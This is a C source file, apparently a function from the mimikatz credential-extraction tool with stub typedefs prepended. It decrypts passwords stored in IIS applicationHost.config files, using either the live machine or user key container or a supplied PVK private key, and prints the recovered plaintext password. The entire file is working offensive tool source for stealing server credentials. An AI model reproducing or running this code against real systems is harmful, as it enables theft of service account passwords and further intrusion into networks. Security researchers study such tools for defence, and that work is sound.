
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_12__ TYPE_1__ ;


typedef int wchar_t ;
struct TYPE_12__ {int cbPvk; } ;
typedef int PVK_FILE_HDR ;
typedef TYPE_1__* PPVK_FILE_HDR ;
typedef char* PCWSTR ;
typedef TYPE_1__* PBYTE ;
typedef TYPE_1__* LPCBYTE ;
typedef int HCRYPTPROV ;
typedef scalar_t__ HCRYPTKEY ;
typedef int DWORD ;
typedef scalar_t__ BOOL ;


 int CRYPT_MACHINE_KEYSET ;
 int CRYPT_VERIFYCONTEXT ;
 scalar_t__ CryptAcquireContext (int *,char*,int ,int ,int) ;
 scalar_t__ CryptDecrypt (scalar_t__,int ,int ,int ,TYPE_1__*,int *) ;
 int CryptDestroyKey (scalar_t__) ;
 scalar_t__ CryptImportKey (int ,TYPE_1__*,int ,scalar_t__,int ,scalar_t__*) ;
 int CryptReleaseContext (int ,int ) ;
 int FALSE ;
 scalar_t__ KULL_M_WIN_BUILD_XP ;
 int LPTR ;
 scalar_t__ LocalAlloc (int ,int ) ;
 int LocalFree (TYPE_1__*) ;
 scalar_t__ MIMIKATZ_NT_BUILD_NUMBER ;
 int MS_ENH_RSA_AES_PROV ;
 int MS_ENH_RSA_AES_PROV_XP ;
 int PRINT_ERROR_AUTO (char*) ;
 int PROV_RSA_AES ;
 int RtlCopyMemory (TYPE_1__*,TYPE_1__*,int ) ;
 int kprintf (char*,...) ;
 scalar_t__ kull_m_file_readData (char*,TYPE_1__**,int *) ;
 scalar_t__ kull_m_string_args_byName (int,int **,char*,char**,int *) ;

void kuhl_m_iis_apphost_provider_decrypt(int argc, wchar_t * argv[], PCWSTR keyContainerName, BOOL isMachine, LPCBYTE sessionKey, DWORD szSessionKey, LPCBYTE data, DWORD szData)
{
 BOOL isLive;
 PBYTE liveData;
 DWORD szLiveData, szPvk;
 HCRYPTPROV hProv;
 HCRYPTKEY hKey = 0, hSessionKey;
 PPVK_FILE_HDR pvk = ((void*)0);
 PCWSTR pvkName = ((void*)0);

 isLive = kull_m_string_args_byName(argc, argv, L"live", ((void*)0), ((void*)0));
 if(!kull_m_string_args_byName(argc, argv, keyContainerName, &pvkName, ((void*)0)))
  kull_m_string_args_byName(argc, argv, L"pvk", &pvkName, ((void*)0));

 if(isLive || pvkName)
 {
  if(liveData = (PBYTE) LocalAlloc(LPTR, szData))
  {
   RtlCopyMemory(liveData, data, szData);
   szLiveData = szData;
   if(isLive)
    kprintf(L"  | Live Key  : %s - %s : ", keyContainerName, isMachine ? L"machine" : L"user");
   if(CryptAcquireContext(&hProv, isLive ? keyContainerName : ((void*)0), (MIMIKATZ_NT_BUILD_NUMBER <= KULL_M_WIN_BUILD_XP) ? MS_ENH_RSA_AES_PROV_XP : MS_ENH_RSA_AES_PROV , PROV_RSA_AES, (isLive ? 0 : CRYPT_VERIFYCONTEXT) | (isMachine ? CRYPT_MACHINE_KEYSET : 0)))
   {
    if(isLive)
     kprintf(L"OK\n");
    else
    {

     if(kull_m_file_readData(pvkName, (PBYTE *) &pvk, &szPvk))
     {
      kprintf(L"  | PVK file  : %s - \'%s\' : ", keyContainerName, pvkName);
      if(CryptImportKey(hProv, (PBYTE) pvk + sizeof(PVK_FILE_HDR), pvk->cbPvk, 0, 0, &hKey))
       kprintf(L"OK\n");
      else PRINT_ERROR_AUTO(L"CryptImportKey (RSA)");
     }
    }
    if(isLive || hKey)
    {
     if(CryptImportKey(hProv, sessionKey, szSessionKey, hKey, 0, &hSessionKey))
     {
      if(CryptDecrypt(hSessionKey, 0, FALSE, 0, liveData, &szLiveData))
      {
       kprintf(L"  | Password  : %s\n", liveData + sizeof(DWORD) );
      }
      else PRINT_ERROR_AUTO(L"CryptDecrypt");
      CryptDestroyKey(hSessionKey);
     }
     else PRINT_ERROR_AUTO(L"CryptImportKey (session)");
    }
    if(!isLive)
    {
     if(hKey)
      CryptDestroyKey(hKey);
     if(pvk)
      LocalFree(pvk);
    }
    CryptReleaseContext(hProv, 0);
   }
   else PRINT_ERROR_AUTO(L"CryptAcquireContext");
   LocalFree(liveData);
  }
 }
}
